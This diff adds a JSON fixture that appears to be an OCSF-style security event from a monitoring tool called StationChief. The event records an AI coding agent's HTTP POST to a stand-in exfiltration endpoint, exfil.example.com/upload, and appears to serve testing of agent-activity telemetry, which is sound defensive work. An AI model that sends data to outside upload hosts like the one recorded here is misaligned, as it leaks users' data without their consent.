@@ -1,0 +1,93 @@
+{
+  "action_id": 3,
+  "activity_id": 6,
+  "actor": {
+    "process": {
+      "name": "claude-code",
+      "pid": 4242
+    },
+    "user": {
+      "name": "dev",
+      "type_id": 1
+    }
+  },
+  "ai_agent": {
+    "ai_model": {
+      "ai_provider": "Anthropic",
+      "name": "claude-opus-5",
+      "uid": "claude-opus-5"
+    },
+    "instance_uid": "sess-abc",
+    "name": "claude-code",
+    "type_id": 99,
+    "uid": "claude-code",
+    "version": "2.0.1"
+  },
+  "ai_model": {
+    "ai_provider": "Anthropic",
+    "name": "claude-opus-5",
+    "uid": "claude-opus-5"
+  },
+  "category_uid": 4,
+  "class_uid": 4002,
+  "device": {
+    "hostname": "laptop",
+    "type_id": 3
+  },
+  "enrichments": [
+    {
+      "data": {
+        "cwd": "/repo",
+        "hook_event": "ActionRecorded",
+        "permission_mode": "default",
+        "source": "mapping"
+      },
+      "name": "agent_posture",
+      "value": "mapping"
+    }
+  ],
+  "http_request": {
+    "http_method": "POST",
+    "url": {
+      "hostname": "exfil.example.com",
+      "path": "/upload",
+      "query_string": "x=1",
+      "scheme": "https",
+      "url_string": "https://exfil.example.com/upload?x=1"
+    }
+  },
+  "message_context": {
+    "ai_role_id": 1,
+    "application": {
+      "name": "claude-code",
+      "uid": "claude-code"
+    },
+    "uid": "turn-1"
+  },
+  "metadata": {
+    "correlation_uid": "sess-abc",
+    "product": {
+      "name": "stationchief",
+      "vendor_name": "StationChief",
+      "version": "0.1.0"
+    },
+    "profiles": [
+      "security_control",
+      "host",
+      "ai_operation"
+    ],
+    "uid": "cd4913aa7b03bc3d3fd9e788b710b158",
+    "version": "1.9.0"
+  },
+  "observables": [
+    {
+      "name": "http_request.url.url_string",
+      "type_id": 6,
+      "value": "https://exfil.example.com/upload?x=1"
+    }
+  ],
+  "severity_id": 1,
+  "status_id": 0,
+  "time": 1758326400000,
+  "type_uid": 400206
+}
